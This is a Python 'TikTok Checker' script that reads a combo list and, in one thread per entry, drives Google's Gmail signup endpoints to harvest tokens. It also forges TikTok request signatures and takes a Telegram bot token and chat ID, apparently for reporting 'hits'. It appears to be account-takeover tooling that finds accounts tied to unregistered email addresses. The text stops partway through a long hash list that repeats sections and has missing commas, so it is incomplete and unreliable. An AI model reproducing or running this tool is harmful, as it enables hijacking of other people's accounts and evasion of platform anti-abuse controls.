import os,time,random,uuid,binascii,json,secrets;from requests import get, post,Session
import SignerPy
import requests
import http.client
import re
from random import choice,randrange
from threading import Thread
import sys
import urllib.parse
from urllib.parse import urlencode

try:from user_agent import generate_user_agent
except:
    os.system('pip install user_agent')

try:
    from MedoSigner import Argus,Gorgon, md5,Ladon
except:
    os.system('pip install MedoSigner')

# --- Color Definitions ---
class Colors:
    RESET = '\033[0m'
    BRIGHT_GREEN = '\033[92m'
    BRIGHT_RED = '\033[91m'
    CYAN = '\033[96m'
    YELLOW = '\033[93m'
    MAGENTA = '\033[95m'
    BLUE = '\033[94m'

# --- Functions from fhs.py (modified to be part of the main script or a class) ---
def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
        x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
        data=payload
        if not unix: unix = int(time.time())
        return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}

class TikTokChecker: # Renamed from nn to avoid conflict and be more descriptive
  def __init__(self):
    self.good_tiktok=0
    self.bad_tiktok=0
    self.good_gmail=0
    self.bad_gmail=0
    self.nudes=[]
    self.hits=[]
    self.list=[]
    self.cok=[]
    self.ttwids=[]
    self.msTokens=[]
    os.system('clear' if os.name == 'posix' else 'cls')
    
    # Welcome Message
    print(f"{Colors.BRIGHT_GREEN}╔═══════════════════════════════════════╗")
    print(f"║     {Colors.CYAN}Welcome to ALi Bssam 💻 TikTok Checker{Colors.BRIGHT_GREEN}     ║")
    print(f"╚═══════════════════════════════════════╝{Colors.RESET}\n")
    
    self.token=input(f'{Colors.YELLOW}- Enter Telegram Bot Token: {Colors.RESET}')
    os.system('clear' if os.name == 'posix' else 'cls')
    self.id=input(f'{Colors.YELLOW}- Enter Telegram Chat ID: {Colors.RESET}')
    while True:
        try:
            o=open(input(f'{Colors.YELLOW}- Enter combo file path: {Colors.RESET}'),'r').read().splitlines()
            os.system('clear' if os.name == 'posix' else 'cls')
            break
        except:
            print(f'{Colors.BRIGHT_RED} File Not Found!{Colors.RESET}')
    self.combo_list = [] # Store usernames from combo for later use
    for _ in o:
        if '_' not in _:
            if '@' in _:_=_.split('@')[0]
            self.combo_list.append(_) # Add to a list
            Thread(target=self.home,args=(_,)).start()

  def gg00(self):
        ua=str(generate_user_agent())
        time0=''
        conn = http.client.HTTPSConnection('accounts.google.com')
        while True:
            try:
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
    }
                conn.request(
        'GET',
        '/lifecycle/flows/signup?biz=false&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&osid=1&service=mail',
        headers=headers
    )
                response = conn.getresponse().info()
                __Host_GAPS=str(response).split('Set-Cookie: __Host-GAPS=')[1].split(';')[0]
                tl=str(response).split('TL=')[1].split('&')[0]
                break
            except Exception as e:''
        while True:
            try:
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9',
        'referer': 'https://accounts.google.com/',
        'user-agent':  ua,
    }
                response = requests.get(
        'https://accounts.google.com/lifecycle/steps/signup/name?emr=1&flowEntry=SignUp&flowName=GlifWebSignIn&followup=https://mail.google.com/mail/u/0/&osid=1&service=mail&TL='+tl,
        cookies=cookies,
        headers=headers,
    )
                tok=re.findall(r'"(.*?)"',str(response.text).split('<!doctype html')[1].split('/lifecycle/_/AccountLifecyclePlatformSignupUi/')[0])
                po=0
                for i in tok:
                    po+=1
                    if 'SNlM0e' == i:
                        break
                hl=tok[0]
                s1=tok[29]
                at=tok[po]
                break
            except Exception as e:''
        while True:
            try:
                name=''.join(choice('azertyuiopmlkjhgfdsqwxcvbn') for i in range(randrange(4,13)))
                cookies = {
        '__Host-GAPS': __Host_GAPS,
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'E815hb',
        'source-path': '/lifecycle/steps/signup/name',
        'hl': hl,
        'TL': tl,
    }
                data = 'f.req=%5B%5B%5B%22E815hb%22%2C%22%5B%5C%22'+name+'%5C%22%2C%5C%22%5C%22%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2Cnull%2C%5B%5D%2C%5B%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2C%5C%22mail%5C%22%5D%2C1%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        while True:
            try:
                yaer=str(randrange(1980,2007))
                month=str(randrange(1,12))
                day=str(randrange(1,28))
                cookies = {
        '__Host-GAPS': __Host_GAPS
    }
                headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
        'origin': 'https://accounts.google.com',
        'referer': 'https://accounts.google.com/',
        'user-agent': ua,
        'x-goog-ext-278367001-jspb': '["GlifWebSignIn"]',
        'x-goog-ext-391502476-jspb': '["'+s1+'","mail"]',
        'x-same-domain': '1',
    }
                params = {
        'rpcids': 'eOY7Bb',
        'source-path': '/lifecycle/steps/signup/birthdaygender',
        'hl': hl,
        'TL': tl,
    }

                data = 'f.req=%5B%5B%5B%22eOY7Bb%22%2C%22%5B%5B'+yaer+'%2C'+month+'%2C'+day+'%5D%2C1%2Cnull%2C0%2C%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2C0%2C1%2C%5C%22%5C%22%2Cnull%2Cnull%2C2%2C2%5D%2C%5C%22%3CiUVqRR0CAAZTFvCGcxaNEqaeSioWmer0ADQBEArZ1AbW8EaBzfF11OToJc8rVRf567WhHSsHVMS0KPTiaZwr5pRNxLkK9RFieh5kZPBxzQAAAfCdAAAACKcBB7EAR5bLmW4_pyTl0q5GLHZl4BUTtf5jKTDjvxJk-VC9uNwzsTszdq9QTwfQ0_DHYWRUQ5D-0Q7wlf8WYIT1MtRwAzJlzeQGANesVgivzo24pJLwbK5u09y-72TKV70_6M1xVh6LwwBKoiUNY7W10Ng--cONycFdiuW5-9A6YPDsVqeQjqoACYUa5myX0nOSoLdgirK3Dee6DPRA24QuCxHZdbPJw9ftTchvQHfPacZ2qTX75RGo2yPbKidai5QfBmaQnPDEpAO6vPu0OkTykd1WQUEQQMhO8uLWnPtqnEzJRwVYHYo8JSRIdx3227TV7CmTonE1PHiZPyPb8zB0LHwFrgAhjTUS2edAfguaYgQQS5A1tWvNaGEoeBxrc-B0q_cPQkfrJbCBsCVe6nTN3SZx2QrDfKuc9Z8vOg7OCCkIv98DFRBbJr0WJueIAuIWpCqXyIOpsMyVWHVcgoGiQWLGYzigfAmY47zxxt0CPKslU2gVH5ZzCnEAtfzlG5oG50mS94lg9QEWfIeQkghJ8KXp8SUUnu3mVLKATFn_Ju9AKekgoHGu4gjDfzxzM4MStJojZS98bAVPhagqvp-UCIpAu4Ym7egIqFexR_YNTmxXPbpNHPFYv6FN9k2RDS1WLYxT4N7TzgtWJGc-GF9YZbGzpaeTjbO2_-0GSPX9tmael40o0E-ocd6OxEISENG_ZQTMWxWZzPdYNXxJOD5yAUpbZJR_0WBRk_bA5-PXX6hpA7TvwclDq77YLxWTeVKVmrYDPTPfVc3uAUOrMPV2J565-m9UJ1zqrXALM0fwdfyQPEN4K9hrn9l5U6UJMK18_C349ioqL5kz_yeyj1fKtnDqNlQjkD-xrAfEDqiDAfYhjaFRn9mdymFELdQSWhHCD8ItfapoezIH8OB_wYUKnJiJ76yiweU3h4AV1RxNKDEcIsRVixEyLwSRrl-UsP-MSM8LflbsVQBuiwLQLEbJLFMSlolNVXrlWWgOaWMyhVz6yay4dgiaUustS2xqooWiKyeVMlyDFrwQ092qxBkmsKLqgtVOVInzdW6gNiA79rxALtZXsrlSG1xnSbwwGpxU7qLqUMqb5taN6_RCnzS7gRztKjP_Nxcm2VZe9e-UsIbaFXduTbvYrfELi_21Cwr3mgYvu5nOwK-_lpFPcRAn35xw5K15hZpyAZ0DHJVvWb2MjDNNJiQC9JEexsN4QHBnNRWi4JazEmrhoBPRVcQ970qOY5ayuAFAWbV3P1QUmi5KRHzYVvPBXDyYUK4-Txd5RYKgg1DUxlWAQUXHQJ3pHwLPVwN3QxGM5BWcW2716AhrcPWzn7YvLrYJ1oauQSMKtJw9bNLhnVibIRVJ2epZnPQN3jg3bEqMn5NHj50cUFpF9qe1VlmHd0x7eQsXkGIVUYh5d-mwkOuZ_B-zSW0ifIq5Bf1mXKF9JgyAW8dhETFqXH-a_gjiyAS2BEefo-i3TwaeuAwyh4F6aP-nh168NrICOLZQ92jk3xkk7gYjF_bvxsYwPyz1YRL2n7N1PQAHRdCkqAcjaJ90ieUUNTPwtiFqIhglzrf3GGMHpggdViRoeAzPMlO-ENtQhPqWwWfqnVMkHSLxlU-cfLVPap97ZBQNlNY4_D9zu722n-eOPRrXo53yyx-OXpb3qqFb7y7UR4cYCmXxj0FWTl-RWpnUyxLUwicH2MnhsDaJWBA54fRvNI4nOY8f5VyVBXfaXgLQwJqNrRGcFtLO8Lg1xvHIKDTV_zrz9D168CndnByIESfYOC0OkLt-WBmYbTmNiiHwS7dg8pHngFY389zqAq5ytk4HcyhOtmUgpx2YVIYuVpKh7p78Z8SdBVMyvztqXliq7uwtR8-FJcb0C-CEdDCmdDNB3Hpzkf-1WQGIAqNJjrUz9h6VWJYxmTgc_XPm2s-yk77e5fa9OJ4xjOHeseNtGYhen6gWmNMbh60fl9eemdfE0Fkgp3Hs7MsPkciPLfSFR_xsW8nIVaQEZJSISY-dC0klZTNK2SpWolbZ854i1ErGQCc_3HBh0hIlsPJrqcoPDlmhHs-1Iqtr18aJyfNU_7Iq-IqE9sy0dLVRowqFqFSnDKcv2BjvBF0atL2e6HcXhIQtMZlUKVUl8-GlyO1wqPZrwBY6Y-VWSie93XEcz5oUunkDkTM9P9ZTiLQKQdknPD7Xtis-nkyGya1UtnF-IChRpMnBfaW9V790HZFYD6PKJ15nVIKj42gibtzuK7ssA-3WJwSwA0fKpeT_73UPoa6HE4oE7bhcjzo9ksAOAp99PAuHnJh0J4rIiCeEU7tSbFK2Pw67VuGjI4N9X0j7k0GLzeI688KPB2DGurMp-LvC2IG9CtMQ640NEqeL0E1TxIxx96o0Ei7CyL4Q2QG_FacW0ARHSWSxiR0csbEfl4df9woMkq2kS3MNGmw4kqr0traabbonvPGzXCpuoOSIPwSAbmSPycOrOITw8TgIN5VRiAqm6_SiCsSrukPXsJNk7qRfa4jLW72QUxT7qQILT3G3SPVLYotsWTmpSesKuwYooo4s5Sb4cIXDDDVB4GKYuDmPvSaaa-QLfXeQgzxHLcI_dLHTGn7wWI8zdbghSkdQUIWw3jZvg0uFHjut66bQOSPGeZMP7XWOZtZR0Dgesg8pQ9R-5_yAhQc67C1CryDKkJk5CP-f8Qky3afIppWOH_oPYaLFzW5Da_be-b3jc4qVxlr3_QYH9xQh0JY4Ov1OwFW8BVLCxuILcmtcxoGdnx6j-E73w570E6P_kvuoxx8cYzz5XYamgXz616GpYv6W428iFKuWJea29by1EczNDyuZaWBPc0K0j4XU83JYN0qI-yapNGwUj9xg9D5_xrtQRLruSyEjym8_k_kdUNoN4-y_FzIeygIvPEx3sUioZcpSNDzDbI_dmCFFtHzRxlNVRJ4ztU3vHyO3nAPXt2PrvbJ9e82zeqcYv3z5nbKwr8utji-szOrqg4gKCGm4LVSlgKyWz2C8ZmkTy5VYWBbScWuYTwxb_6GXZW4pcDJIVbtjALx9xDHjYLTHv52ufuhThsXq60u2RQmXaR%5C%22%2C%5Bnull%2Cnull%2C%5C%22https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F%5C%22%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5C%22mail%5C%22%5D%5D%22%2Cnull%2C%22generic%22%5D%5D%5D&at='+at+'&'
                response = requests.post(
        'https://accounts.google.com/lifecycle/_/AccountLifecyclePlatformSignupUi/data/batchexecute',
        params=params,
        cookies=cookies,
        headers=headers,
        data=data,
    )
                break
            except Exception as e:''
        tm=''
        try:
            return {
                'tokens':{
                    '__Host-GAPS':__Host_GAPS,
                    'TL':tl,
                    'hl':hl,
                    'at':at,
                    's1':s1,
                },
                'info':{
                    'name':name,
                    'birthday':{
                        'day:month:year':day+':'+month+':'+yaer,
                        'day':day,
                        'month':month,
                        'year':yaer,
                    },
                    #time_get_tokens':tm,
                    #time':time(),
                    'by':'@DDDBB4 - https://t.me/tools_watan'
                        },
                'errors':[],
            }
        except:
            return {
                'errors':['error get tokens'],
                'tokens':{

                },
                'info':{
                    'by':'@DDDBB4 - https://t.me/tools_luffy',
                   # 'time':time(),
                    #time_get_tokens':tm,
                },
            }

  def check_linked(self,email):
      while True:
          try:
              hash_list = [
                  "cafe66f2ae8a76f077cbd626ea86df79",

"1232e3b522985d084e6dc5f09927250b",
            "6543899cce4328907dba50c5b9aa63c5",
               
           "e30781fff036cc5eb205e7c58dfbb7bd",

"2593796f7e6b8b336682c32360475555",

"d0d806d6108275dfa1152a6e7879979c",

"a10c0adde90da8a842901d661a8d658d",   
    "3b430002ae1d099bfc055494acea77ac",

    "7f108a47a8c39f143787a8fe6593d349",


'c4fa59b59ece70395023afe78baa5d8a', 
'36144c9f68b6eb8aefb501a6a31e8118', 
'ccbe4b0c894f0d4c1e5c679f07287b3b', 
'cb74967182ec687b9fc0435bc4fcae89', 
'21953b31d25e7b508e8c64c24f48a108', 
'1b3360c5cec4c44457b8813cb9536e45', 
'3df46a118be3401707d30327a8858d74', 
'900b6e7958a805f3113f317b938c1ebb', 
'a147960a734ce913251d91e75bd41de2', 
'263610f531b715adfb34d26567e9b6f3', 
'b6fde9cea09ad4be89b9121b7f1a7a04', 
'9edada27bfcec7e8a1ff649beea19c76', 
'1926dd91277c79633c4cde74ecf5182e', 
'd64af91724d38f7bc73b3fef0fca8db9', 
'20b2f37bbcf5595b9d3a513df868f10a', 
'73a38762633252801cc48c7ce96b126a', 
'8ded08b5a2f7c138f82ef19bff62b014', 
'08fb9b8270b8885efcd6348821a3b595', 
'01a268b5490b71262326329776e67e42', 
'bcbe07458dd7cb6bcf41da270fc7eec8', 
'9c3901e64f0920e9f0efd8dcbb09c9af', 
'1a4bdfb7776f6734298f4c9075d2a418', 
'0138e069e8fe6c8b07e1a0db9038a332', 
'2d9940d16376dee30d53112f55a15136', 
'aafcba353ff35b0031746c72682aaca2', 
'9dea2180a9e6edf163a18f9f0420496c',  
'ab10d6d678a0d48de5bd51f16009b4d8', 
'87e11bed392b70782e58dec0370d8447', 
'1d3f912a6800fbdf69a3fc383ce5ee58', 
'93d69013bc71583716e497c7fc17ca27', 
'f250acc8b1e5d5f92ee8be3699fd6536', 
'b2aecd030b057c45366dad00cefecd7d', 
'4b4c3c47cbdd5bd38202403125091a51', 
'9e71174495cc2c9ff6674b29233305ff', 
'f9044bb2a34f86a45b45171e0a92ef6d', 
'cac437b128dbe68afbd33d0e80e56483', 
'36a704a0ee788e83c547efd31eea3846', 
'0e3dd0aca3cab9de1edd01492d849ac5', 
'632b6cab67509bbfe17c0db9e49617d8', 
'0064350770d0ccca2ab54a379b8ba9bf', 
'b25614823870dcfcba6fdef6e72af5d1', 
'29e5a771a6b47b114b75af600e290edd', 
'e410b62db135a6e953714b2405808e97', 
'fca9734feeec2910a19ef9dd57d8426a', 
'7298c225f1bb7025e2c74b3146e8e497', 
'7772b65eaf8af91e68b40b6faed360cb', 
'b51f36b2cefac35c1847bb1631113588', 
'a376eb74de92c39e43114c740490477d', 
'f466e8e3e2f43915db01ae6efbcf5e7b', 
'32ace4984ce8e910fdb958cf55f01c40', 
'5325618720103e7987ac8e1eb7777f79', 
'c563af7e7ffd63bf083e1f18d78dfb0d',  
'44f37d99726fc9895b947db8e822469f', 
'eeb95e2378303763df06c3a40a5f3a95', 
'30f8ff14e3d5c84f88a1f58d50c59105', 
'c3058b76be0aba378b47697c535eb916', 
'f8bf6728107043373708242322f1f670', 
'a601ada714efa44e70e6a3f202dd7f67', 
'681d5ccf400a4d522a05155627c37415', 
'c7bf9f67464ca6ad4d7027dbd1a39b27',  
'140f6b043b7965b4593d31bc74b720d4'
'c4fa59b59ece70395023afe78baa5d8a', '36144c9f68b6eb8aefb501a6a31e8118',
            'ccbe4b0c894f0d4c1e5c679f07287b3b', 'cb74967182ec687b9fc0435bc4fcae89',
            '21953b31d25e7b508e8c64c24f48a108', '1b3360c5cec4c44457b8813cb9536e45',
            '3df46a118be3401707d30327a8858d74', '900b6e7958a805f3113f317b938c1ebb',
            'a147960a734ce913251d91e75bd41de2', '263610f531b715adfb34d26567e9b6f3',
            'b6fde9cea09ad4be89b9121b7f1a7a04', '9edada27bfcec7e8a1ff649beea19c76',
            'd64af91724d38f7bc73b3fef0fca8db9', '20b2f37bbcf5595b9d3a513df868f10a',
            '73a38762633252801cc48c7ce96b126a', '8ded08b5a2f7c138f82ef19bff62b014',
            '08fb9b8270b8885efcd6348821a3b595', '01a268b5490b71262326329776e67e42',
            'bcbe07458dd7cb6bcf41da270fc7eec8', '9c3901e64f0920e9f0efd8dcbb09c9af',
            '1a4bdfb7776f6734298f4c9075d2a418', '0138e069e8fe6c8b07e1a0db9038a332',
            '2d9940d16376dee30d53112f55a15136', 'aafcba353ff35b0031746c72682aaca2',
            '9dea2180a9e6edf163a18f9f0420496c', 'ab10d6d678a0d48de5bd51f16009b4d8',
            '87e11bed392b70782e58dec0370d8447', '1d3f912a6800fbdf69a3fc383ce5ee58',
            '93d69013bc71583716e497c7fc17ca27', 'f250acc8b1e5d5f92ee8be3699fd6536',
            'b2aecd030b057c45366dad00cefecd7d', '4b4c3c47cbdd5bd38202403125091a51',
            '9e71174495cc2c9ff6674b29233305ff', 'f9044bb2a34f86a45b45171e0a92ef6d',
            'cac437b128dbe68afbd33d0e80e56483', '36a704a0ee788e83c547efd31eea3846',
            '0e3dd0aca3cab9de1edd01492d849ac5', '632b6cab67509bbfe17c0db9e49617d8',

'0064350770d0ccca2ab54a379b8ba9bf', 'b25614823870dcfcba6fdef6e72af5d1',
            '29e5a771a6b47b114b75af600e290edd', 'e410b62db135a6e953714b2405808e97',
            'fca9734feeec2910a19ef9dd57d8426a', '7298c225f1bb7025e2c74b3146e8e497',
            '7772b65eaf8af91e68b40b6faed360cb', 'b51f36b2cefac35c1847bb1631113588',
            'a376eb74de92c39e43114c740490477d', 'f466e8e3e2f43915db01ae6efbcf5e7b',
            '32ace4984ce8e910fdb958cf55f01c40', '5325618720103e7987ac8e1eb7777f79',
            'c563af7e7ffd63bf083e1f18d78dfb0d', '44f37d99726fc9895b947db8e822469f',
            'eeb95e2378303763df06c3a40a5f3a95', '30f8ff14e3d5c84f88a1f58d50c59105',
            'c3058b76be0aba378b47697c535eb916', 'c7bf9f67464ca6ad4d7027dbd1a39b27',
            '140f6b043b7965b4593d31bc74b720d4', '8f09f3ae2ae631cf7e633f0731dc5765',
            '689b28321819e175075a1c52a875aa10','51742b4d12eee256f2b5cef78762f7e3',
            '80f75f02c7b7ed70507b8788ee4e332b', '0ede7d94f7844b3eb2a84c2b74787a18',
            'abf81647b3cc6342e4d37bfb15071f47', '77b8a5ca219eefbc73b5ec1d37bd1878',
            '860b1c9e2e32d114150f7531a31aee12',
'60fa764bc7f52a3c302b9da366e8ddee',
'4a86af49c0d2cc7b1a0570a767a06049',
'25fc3dd233e5c69d3529c567d434aadd',
'f0311769f6ec98bd296fd20e96d7cc4a',
'e17a001f27ca66209bce3877fbf25c0f',
'db63545ec894c52649c332c9e3ba7a8f','48321d7c0d829d208e954aad4ea13bd6',
'c3c21303e924f9432cc16d090b21525b','4a47e8b2334dee56d97b718d7a9c5e25',
'a1fb2e3b964e87510369376ad841a0c4',
'86fff059edd8031249c192acd7729534',
'13e7698d1b2233dcb239511c59293fc3',
"cafe66f2ae8a76f077cbd626ea86df79", "9c5f3bd655c1073be5766126e5de6fd3",
                "53824e1723b4981d6cd70509b914098f", "1342c2d734388562d6459a5a9fe72792",
                "f1ff89b59a6ba357d77e98bdcf255cab", "7da0a62f4f89c6649b8dfa160d6cec8d",
                "dbf07d996eb8201596c24c09ae323267", "9cc709863127d0aaf365cd16de02c219",
                "55e806351ecd3cc6b61ef91aecc7e505", "697da55c5506fd52436c701c1e2b52f4",
                "bf0bb6f9349449bd775325522cceba25", "57169db67755173ad686ac0adbf61b2c",
                "414944c36526c4965203cdc5d6430586", "a2939903b2da2d314749d9eda608dee8",
                "42b2e8551486b0628ab16c7cc8e90ba1", "27005da3a7d772cb382c3eaac3c090af",
                "ab44c8c16bc5aaf4f3edef66b8915ef7", "2274f897b348647258efdb1b005216e0",
                "d8dffcf38a761c5e8a509b4aea7a4303", "6052a82299cb2b38874dee88c82a0d21",
                "93ab06dc14cef94ffacf9cad56314b65", "ff925b0293db2e1a647b4f615fd815e5",
                "329e7d2ca6364cf94db07ab521275673", "acaed5f00fb0910a53772ec701b9e850",
                "a4a9c45ce50f087e31d8dd90606565dc", "610a8a6ccf26c62d0849a292918eaafe",
                "41fe5fe6c60679e9ec18c5af7ba05c69", "c83a8c956921e7e35398c02d554112b5",
                "9c4254d518f4796d67825fcf1b35cfa8", "c544414665b9558f8157a55e65f7d44e",
                "d7ca96c365b263675a102a582972feea", "5bb1cd7de83db6f316b69e3b045701dc",
                "5845e1e5be9ef3bf73c22b6527bd0c8e", "37fb0b33c8e72da7130d41dbb466db86",
                "9cf1061a9235aad06d4dda19485a108c", "07849301f75b8ba5090258904cdb98f4",
                "8eae100188029eca8fd6002b2198de8f", "69ac0eea723bdfda1f1633171ba4e18f",
                "3599955114effa5ff50e494135012856", "a1593241c82c93e5c19fa180ef5b21a6",
                "a624d9823074741e1a91bf1cbcccfd63", "69be771087f3392967cf9dddf6c76935",
                "fb2253e2732428600ff8bfdaa1229adc", "594e8f0cd3bd7d7bed94161b9aee6b86",
                "68ca12e10055cf7f3e8200d82586d8d3", "e6e25d852227cc3006fdfef85dd38d81",
                "e160f93facb5c030a029c74beb2e234b"
    "df7a17980c069db2316fc6d8e668cacf",
    "65c6dd105c5248895834a5741498129d",
    "6c660a20292158a17086f76ea489596b",
    "57b1bb14939a7ffee8e8cf7ae1e58b64",
    "c66892b3b7062a2287f338d3c75d28b5",

"31b2653d315ad2df648c59be4dd3c97b",
    "6f3fcaabd10994c4d6f3c8987a02c11b",
    "97979e4ead059d1bf51f8048a6038a44",
    "6f3fcaabd10994c4d6f3c8987a02c11b",
    "c44bdacce13656aa68928a267a00885d",
    "69db14f49c65f829ba228fb674dc5783",
    "5121da46ebd6908c661f204eb1bdf390",
    "cd9dd1c4b4598d7a95dc4d296c055e4c",
    "a948087e8602647aa2417b71401b98c8",
    "7bc7638f77025b0c8f397913adb23944",
    "49962c217f3b05f2bc46f1ce1382b664",
    "12982ad9ea91dcf1a21027dd75eb7715",
    "733a6bc05f842ec198e5dcc00f4c8f40",
    "5afb092e4e8b8f317afd0ca790dd4b12",
    "7eab67b617139a5cd4d54acb74a981ec",
    "05946e47542c4bfb7dd1029ac9d02d9f",
    "4db80548f0721446810b97976d10ff86",
    "e624931c16f25073c9e093afb176687d",
    "f09b99f844ee2f52ae2bdb2f02213476",
    "4efef2ff09e8b18333e2b6c034fe176f",
    "a3067782e3d4b93ab55a83d457d649d5",
    "6442d7441baebb712abb3338fc78cad9",
    "eefab72e2f1762a8a18b8b0086bd573b",
    "b726ff6545886c22891c518b1ab2c018",
    "60cdc8b6807824fb826bc2bc2d6a86a3",
    "a6101eaebf59dda2c9245d29a78c794f",
    "5b4a65219248b9db66c9515262a95c74",
    "8bcd84fa7de6e259a5c658044669e08d",
    "40dd05308b13c1e962c604610049a5a8",
    "a21fed4ad4391fe6345f89fd5d109d08",
    "4298d8be202d8467a9ae2037ad315fe3",
    "90291ed7f741eacab2d7614948fdff52",
    "3a0cee07f322f7457e28d714b7f2e141",
    "015c4a476e9acd03ba1f97aab24bdd2f",
    "12e2daf9d50b9fdc780e638e69194299",
    "b913fc96feca30139330f83a3ac1f729",
    "e477678baa3953e2fa8e9249ea79ad3a",
    "2882760c9261f6704d5cabc5f5d6303d",
    "2c50e29900b739b4cbee1636512b533f",
    "3117d32622cfe4f1a04affe33798d587",
    "c6f2a194ac4ab96886e98979b85de2e6",
    "1cd90a76406ca914523138fa3be9fea3",
    "6432c4926bd4c145bccd4ac5f18013ce",
    "2108c7131efe9a342cfce5d4b612407c",
    "8cc651649cac98d1c4f2dce85c3bccc1",
    "7a5228775d3c86d3ea96290d1f44452a",
    "20cf68252042beaec01ab1a5f6d9dab7",
    "75816ca2320f9b5c276463aa3f9ea4aa",
    "af47a38857344ca39cc36e26a5097cf4",
    "d6d3cf94b0563b8bf6edf3b07950bd1e",
    "b41eb8a42aa2b791c17be87221a0772e",
    "1d002ac4394cddf8f710613aab3ed625",
    "3ba67d338f3a5424480d543ef82ef309",
    "b7a87b85e06ca8353910e6cfe5f70bd0",
    "21ba39babbba73992f24f0f126bf7a55",
    "9358abde75ed36b6f3e93bd5ff3ec77e",
    "61ffb2a4b1dd47b8fd6b01c8bd02eafe",
    "0b6883c0978c35b4c3ba23f29d5001c2",
    "afa9e2bfc0613ea961861b8b6dece2ce",
    "98388165c3d4844e657e7836dd2cc78a",
    "6df7d11af8d417aa33e57cfef088410b",
    "b5f30ae6ff9496f7a6561bc1a06ca0b4",
    "60d18cd7da97db29a026689b60dbdc71",
    "79a5c086b83221fbcc3e395bcb5b6bee",
    "4e5da564b32ebe325db4bd6196a728cc",
    "8a8d3dcf2e14c54e51b4591f05c0cc76",
    "6b8927ba0bccb085c17b3db2e70d53cd",
    "e6804d1d23b27a1968a7962dcb9bc1ae",
    "8b5f042c870218867df2c33497778572",
    "20c9b65cc050f5e6eb0289dcb98f95c4",
    "ae0e18816d946762e3c3392a221f198e",
    "0b4176ee5aa2413b319d673d6cab1b81",
    "ce5a2dc13ab715c967d333b24236f7d7",
    "645d465c63003f506c752cd5a97c1e82",
    "7cadbdf13b0b5d74f624634a92d46f11",
    "57e968a0e406fee2f33a832e21aff59a",
    "1f0d6ce685ca5d9f8fad66e9c0ca8b78",
    "87cb87491d35c9addc62dc8da130a316"
'c4fa59b59ece70395023afe78baa5d8a', '36144c9f68b6eb8aefb501a6a31e8118',
            'ccbe4b0c894f0d4c1e5c679f07287b3b', 'cb74967182ec687b9fc0435bc4fcae89',
            '21953b31d25e7b508e8c64c24f48a108', '1b3360c5cec4c44457b8813cb9536e45',
            '3df46a118be3401707d30327a8858d74', '900b6e7958a805f3113f317b938c1ebb',
            'a147960a734ce913251d91e75bd41de2', '263610f531b715adfb34d26567e9b6f3',
            'b6fde9cea09ad4be89b9121b7f1a7a04', '9edada27bfcec7e8a1ff649beea19c76',
            'd64af91724d38f7bc73b3fef0fca8db9', '20b2f37bbcf5595b9d3a513df868f10a',
            '73a38762633252801cc48c7ce96b126a', '8ded08b5a2f7c138f82ef19bff62b014',
            '08fb9b8270b8885efcd6348821a3b595', '01a268b5490b71262326329776e67e42',

'bcbe07458dd7cb6bcf41da270fc7eec8', '9c3901e64f0920e9f0efd8dcbb09c9af',
            '1a4bdfb7776f6734298f4c9075d2a418', '0138e069e8fe6c8b07e1a0db9038a332',
            '2d9940d16376dee30d53112f55a15136', 'aafcba353ff35b0031746c72682aaca2',
            '9dea2180a9e6edf163a18f9f0420496c', 'ab10d6d678a0d48de5bd51f16009b4d8',
            '87e11bed392b70782e58dec0370d8447', '1d3f912a6800fbdf69a3fc383ce5ee58',
            '93d69013bc71583716e497c7fc17ca27', 'f250acc8b1e5d5f92ee8be3699fd6536',
            'b2aecd030b057c45366dad00cefecd7d', '4b4c3c47cbdd5bd38202403125091a51',
            '9e71174495cc2c9ff6674b29233305ff', 'f9044bb2a34f86a45b45171e0a92ef6d',
